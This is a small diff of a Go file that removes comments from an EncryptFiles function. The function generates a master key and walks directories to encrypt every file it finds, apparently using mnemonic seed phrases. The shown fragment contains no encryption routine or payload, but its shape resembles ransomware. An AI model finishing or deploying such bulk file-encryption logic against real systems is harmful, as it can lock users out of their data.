@@ -13,15 +13,11 @@ import (
 	"github.com/tyler-smith/go-bip39"
 )
 
-// EncryptFiles walks directories and encrypts all found files with mnemonic seed phrases
 func EncryptFiles() error {
-	// Generate a cryptographically secure master key
 	masterKey, err := generateMasterKey()
 	if err != nil {
 		return fmt.Errorf("failed to generate master key: %w", err)
 	}
-
-	// Get all target files
 	files, err := walk.Walk()
 	if err != nil {
 		return fmt.Errorf("failed to walk directories: %w", err)
